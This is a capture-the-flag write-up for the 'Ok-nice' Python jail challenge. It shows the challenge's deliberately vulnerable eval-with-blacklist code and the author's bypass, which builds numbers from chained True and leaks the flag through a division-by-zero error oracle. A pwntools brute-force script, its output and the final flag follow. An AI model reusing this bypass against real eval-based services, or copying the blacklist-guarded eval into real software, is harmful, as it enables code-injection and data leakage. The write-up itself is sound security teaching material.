# Ok-nice

Category: MISC

Points: 152

Solves: 66

>Ok nice

### Solution

```py
#!/usr/bin/env python3
flag = open('flag.txt').read()

print("Welcome to the jail! It is so secure I even have a flag variable!")
blacklist=['0','1','2','3','4','5','6','7','8','9','_','.','=','>','<','{','}','class','global','var','local','import','exec','eval','t','set','blacklist']
while True:
	inp = input("Enter input: ")
	for i in blacklist:
		if i in inp:
			print("ok nice")
			exit(0)
	for i in inp:
		if (ord(i) > 125) or (ord(i) < 40) or (len(set(inp))>17):
			print("ok nice")
			exit(0)
	try:
		eval(inp,{'__builtins__':None,'ord':ord,'flag':flag})
		print("ok nice")
	except:
		print("error")
```

Looks like yet another pyjail with a blacklist. Furthermore, `sp ! " # $ % & ' ~` and non ascii chars are also banned. We also have a length restriction for 17 **unique** (this is important) characters with `len(set(inp))>17`. Finally, our input will be evaled but with no builtins but `ord` and `flag` will be defined.

From this, we can assume that we need to leak characters of the flag as we only have `flag` and `ord` (which tells us the ascii value of a char). Also, even though builtins are removed, we can still use [python keywords](https://www.w3schools.com/python/python_ref_keywords.asp), eg `(ord)is(ord)` would return `True`. Looking through the keywords, the most useful would be `True` as we can treat it as the number `1` and it won't be banned (uppercase T clutch :pray:). eg `flag[True]` would return the 2nd element. Now, we also see that `+` sign isn't banned either so we can easily index every element in the flag with `flag[True+...+True]` (We can get `flag[0]` with `flag[False]` but this isn't needed). Since we are repeating `True` over and over again we only use 11 unique chars at this point `flag`, `True`, `[]+`.

But if we have the chars of the flag, how do we leak information from them. My first thought was to leak info through errors, since we would get `error` instead of `ok nice`. To do this we can use `Division by Zero` error (assert is banned due to lowercase t). For example, if we have the char `i` we can get an error with `1/(ord('i')-105)` since the bottom would evaluate to `0`. So to do this with the flag we could do `1/(ord(flag[idx])-guess)` and when we get an error, we'll know the ascii value for `flag[idx]`. Although numbers are banned, with can replace `1` and our `guess` with a chain of `True` again. We also will only introduce 6 more unique chars with `od` (`r` is in `True`) and `()/-`, getting us perfectly to 17 unique chars. So our final payload will be:

```py
True/(ord(flag[True+...+True])-(True+...+True))
```

We can write a simple script to test all chars:

```py
from pwn import *

rc = remote("ok-nice.chal.imaginaryctf.org", 1337)
flag = "i"
# index of flag to text
idx = 1
while True:
    # loop through possible ascii value range
    for i in range(30,128):
        rc.recvuntil(b"Enter input: ")
        # format payload with idx True's for flag index and i True's for ascii value
        payload = "True/(ord(flag[True" + "+True"*(idx-1) + "])-(True" + "+True"*(i-1) + "))"
        payload = bytes(payload, "ascii")
        rc.sendline(payload)
        # if error then we know it's the correct ascii value
        if rc.recvline().strip() == b"error":
            flag+=chr(i)
            break

    idx+=1
    print(flag)
    if(flag[-1] == "}"): break
```

```
[+] Opening connection to ok-nice.chal.imaginaryctf.org on port 1337: Done
ic
ict
...
ictf{0k_n1c3_7f4d3e5a6b
ictf{0k_n1c3_7f4d3e5a6b}
```

ok nice, we got the flag.

### Flag

```ictf{0k_n1c3_7f4d3e5a6b}```